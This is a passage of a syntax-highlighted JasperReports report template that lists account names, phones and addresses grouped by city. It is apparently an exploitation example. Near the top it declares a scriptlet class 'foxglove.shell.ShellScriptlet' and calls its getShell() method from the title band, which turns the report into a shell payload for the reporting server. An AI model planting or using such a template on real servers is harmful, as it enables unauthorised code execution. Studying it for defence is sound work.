class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">subDataset</span> <span class="attr">name</span>=<span class="string">"Table Dataset 1"</span> <span class="attr">uuid</span>=<span class="string">"4fcc1d09-9859-48ee-bb6f-8d369bd49113"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">queryString</span>&gt;</span></span><br><span class="line">&lt;![CDATA[SELECT name, phone_office, billing_address_city, billing_address_street, billing_address_country FROM accounts ORDER BY billing_address_country, billing_address_city]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">queryString</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"phone_office"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_city"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_street"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_country"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sortField</span> <span class="attr">name</span>=<span class="string">"billing_address_country"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sortField</span> <span class="attr">name</span>=<span class="string">"billing_address_city"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">variable</span> <span class="attr">name</span>=<span class="string">"CityyNumber"</span> <span class="attr">class</span>=<span class="string">"java.lang.Integer"</span> <span class="attr">incrementType</span>=<span class="string">"Group"</span> <span class="attr">incrementGroup</span>=<span class="string">"CityGroup"</span> <span class="attr">calculation</span>=<span class="string">"Count"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">variableExpression</span>&gt;</span>&lt;![CDATA[Boolean.TRUE]]&gt;<span class="tag">&lt;/<span class="name">variableExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">initialValueExpression</span>&gt;</span>&lt;![CDATA[new Integer(0)]]&gt;<span class="tag">&lt;/<span class="name">initialValueExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">variable</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">group</span> <span class="attr">name</span>=<span class="string">"CityGroup"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupExpression</span>&gt;</span>&lt;![CDATA[$F&#123;billing_address_city&#125;]]&gt;<span class="tag">&lt;/<span class="name">groupExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">subDataset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptlet</span> <span class="attr">name</span>=<span class="string">"ShellScriptlet"</span> <span class="attr">class</span>=<span class="string">"foxglove.shell.ShellScriptlet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptletDescription</span>&gt;</span>&lt;![CDATA[]]&gt;<span class="tag">&lt;/<span class="name">scriptletDescription</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"79"</span> <span class="attr">splitType</span>=<span class="string">"Stretch"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"227"</span> <span class="attr">y</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">uuid</span>=<span class="string">"32a2a8ff-d90a-48d7-b044-5325b5c6264f"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pageFooter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"40"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">line</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"10"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"1"</span> <span class="attr">uuid</span>=<span class="string">"19826638-0487-4bb5-9b15-7e7af63b8dce"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.table"</span> <span class="attr">value</span>=<span class="string">"end"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">line</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"200"</span> <span class="attr">y</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"80"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">uuid</span>=<span class="string">"6f072af1-756c-49f4-82f3-af59e8124296"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Right"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Page " + String.valueOf($V&#123;PAGE_NUMBER&#125;) + " of"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span> <span class="attr">evaluationTime</span>=<span class="string">"Report"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"280"</span> <span class="attr">y</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"75"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">uuid</span>=<span class="string">"02b15e9e-d360-4b82-a140-54b9bd3b0e81"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Left"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" " + String.valueOf($V&#123;PAGE_NUMBER&#125;)]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">pageFooter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">summary</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"149"</span> <span class="attr">splitType</span>=<span class="string">"Stretch"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">scaleImage</span>=<span class="string">"Clip"</span> <span class="attr">hAlign</span>=<span class="string">"Right"</span> <span class="attr">vAlign</span>=<span class="string">"Middle"</span> <span class="attr">onErrorType</span>=<span class="string">"Icon"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"71"</span> <span class="attr">width</span>=<span class="string">"250"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"aa8a8976-039f-45ac-84f3-d8d55b442410"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">imageExpression</span>&gt;</span>&lt;![CDATA["repo:LogoLink"]]&gt;<span class="tag">&lt;/<span class="name">imageExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hyperlinkTooltipExpression</span>&gt;</span>&lt;![CDATA["JasperReports Logo"]]&gt;<span class="tag">&lt;/<span class="name">hyperlinkTooltipExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">scaleImage</span>=<span class="string">"Clip"</span> <span class="attr">hAlign</span>=<span class="string">"Right"</span> <span class="attr">vAlign</span>=<span class="string">"Middle"</span> <span class="attr">onErrorType</span>=<span class="string">"Icon"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">x</span>=<span class="string">"265"</span> <span class="attr">y</span>=<span class="string">"71"</span> <span class="attr">width</span>=<span class="string">"250"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"4b5dd0d1-9011-42cf-ab07-f80c02d3d166"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">imageExpression</span>&gt;</span>&lt;![CDATA["repo:AllAccounts_Res2"]]&gt;<span class="tag">&lt;/<span class="name">imageExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hyperlinkTooltipExpression</span>&gt;</span>&lt;![CDATA["Jaspersoft Logo"]]&gt;<span class="tag">&lt;/<span class="name">hyperlinkTooltipExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">componentElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">key</span>=<span class="string">"table"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"db3dd84a-3743-43b3-ab7e-c4aebdb907df"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:table</span> <span class="attr">xmlns:jr</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports/components"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports/components http://jasperreports.sourceforge.net/xsd/components.xsd"</span> <span class="attr">whenNoDataType</span>=<span class="string">"AllSectionsNoDetail"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">datasetRun</span> <span class="attr">subDataset</span>=<span class="string">"Table Dataset 1"</span> <span class="attr">uuid</span>=<span class="string">"3b2a079f-f600-46a6-a7af-720c4e939e7e"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">connectionExpression</span>&gt;</span>&lt;![CDATA[$P&#123;REPORT_CONNECTION&#125;]]&gt;<span class="tag">&lt;/<span class="name">connectionExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">datasetRun</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:columnGroup</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">uuid</span>=<span class="string">"1e5d630a-c8f9-4dbb-8415-393f7624ca35"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:groupHeader</span> <span class="attr">groupName</span>=<span class="string">"CityGroup"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:cell</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"Sans_Bold"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"14"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">backcolor</span>=<span class="string">"#C0C0C0"</span> <span class="attr">uuid</span>=<span class="string">"aeafecc2-ef7e-435c-ae07-1f45ed6b179a"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Left"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" " + String.valueOf($V&#123;CityyNumber&#125;.intValue() + 1) + ". " + $F&#123;billing_address_city&#125;+ ", " + $F&#123;billing_address_country&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">anchorNameExpression</span>&gt;</span>&lt;![CDATA[String.valueOf($F&#123;billing_address_city&#125;)]]&gt;<span class="tag">&lt;/<span class="name">anchorNameExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:cell</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:groupHeader</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">uuid</span>=<span class="string">"43ffff20-e89f-4f73-ad8d-878e9581274a"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"a76dcb9c-8601-48bc-b9cc-3d1c316e537d"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.colspan"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" "]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"73a40f28-2c08-4849-a2a9-b83ade7a6b7d"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"10"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Right"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$V&#123;CityGroup_COUNT&#125;+"."]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">uuid</span>=<span class="string">"d472eeed-282a-402b-9044-a397ca270655"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"bd0d4582-5684-4e15-8623-b3f1940bf1bb"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.colspan"</span> <span class="attr">value</span>=<span class="string">"2"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Name"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"23562605-5611-41d8-8a40-98ad9d28834a"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"5"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;name&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">uuid</span>=<span class="string">"4612e5a3-cb0d-4533-9b54-9ad9828acbed"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"d81f1db2-9f2e-4665-aa47-3d1a49cc9d15"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"10"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Phone"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"e48d7dee-a092-45ea-8bd8-8440f76a9fd0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"5"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;phone_office&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">uuid</span>=<span class="string">"f0397b7d-4130-4b13-88b1-d89415b269bd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span 